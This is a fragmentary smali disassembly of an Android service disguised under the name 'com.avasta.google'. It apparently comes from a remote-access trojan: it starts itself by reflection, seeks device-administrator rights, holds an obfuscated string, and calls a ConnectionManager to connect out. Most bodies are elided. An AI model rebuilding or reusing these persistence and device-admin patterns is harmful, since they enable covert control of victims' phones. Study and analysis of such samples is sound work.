.class public Lcom/avasta/google/MainService;
...
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/avasta/google/MainService$100000000;,
        Lcom/avasta/google/MainService$100000001;
    }
.end annotation
...
.method public static findContext()V
    ...
    new-instance v7, Lcom/avasta/google/MainService$100000001;
    ...
    invoke-direct {v8, v9}, Lcom/avasta/google/MainService$100000001;-><init>(Ljava/lang/reflect/Method;)V
    ...
    invoke-static {v6}, Lcom/avasta/google/MainService;->startService(Landroid/content/Context;)V
...
.method public static getContextOfApplication()Landroid/content/Context;
    ...
    .prologue
    .line 132
    sget-object v2, Lcom/avasta/google/MainService;->contextOfApplication:Landroid/content/Context;
...
.method public static start()V
    ...
    .line 115
    :try_start_0
    invoke-static {}, Lcom/avasta/google/MainService;->findContext()V
    :try_end_0
...
.method public static startService(Landroid/content/Context;)V
    ...
    :try_start_0
    const-string v8, "ginom.alfa.lib.scan.etepaejhucdoifemyubbjerbt19"
...
.method public onDestroy()V
    ...
    invoke-virtual {v2, v3}, Lcom/avasta/google/MainService;->sendBroadcast(Landroid/content/Intent;)V
...
.method public onStartCommand(Landroid/content/Intent;II)I
    ...
    invoke-virtual {v11}, Lcom/avasta/google/MainService;->getPackageManager()Landroid/content/pm/PackageManager;
    ...
    invoke-virtual {v11, v12}, Lcom/avasta/google/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/app/admin/DevicePolicyManager;

    sput-object v11, Lcom/avasta/google/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;
    ...
    :try_start_0
    const-string v14, "com.avasta.google.DeviceAdmin"
    ...
    sput-object v11, Lcom/avasta/google/MainService;->mAdminName:Landroid/content/ComponentName;

    .line 44
    sget-object v11, Lcom/avasta/google/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;

    sget-object v12, Lcom/avasta/google/MainService;->mAdminName:Landroid/content/ComponentName;
    ...
    sget-object v13, Lcom/avasta/google/MainService;->mAdminName:Landroid/content/ComponentName;
    ...
    :try_start_1
    const-string v15, "com.avasta.google.MainActivity"
    ...
    .line 54
    new-instance v11, Lcom/avasta/google/MainService$100000000;
    ...
    invoke-direct {v12, v13}, Lcom/avasta/google/MainService$100000000;-><init>(Lcom/avasta/google/MainService;)V
    ...
    sput-object v11, Lcom/avasta/google/MainService;->contextOfApplication:Landroid/content/Context;

    .line 80
    move-object v11, v0

    invoke-static {v11}, Lcom/avasta/google/ConnectionManager;->startAsync(Landroid/content/Context;)V
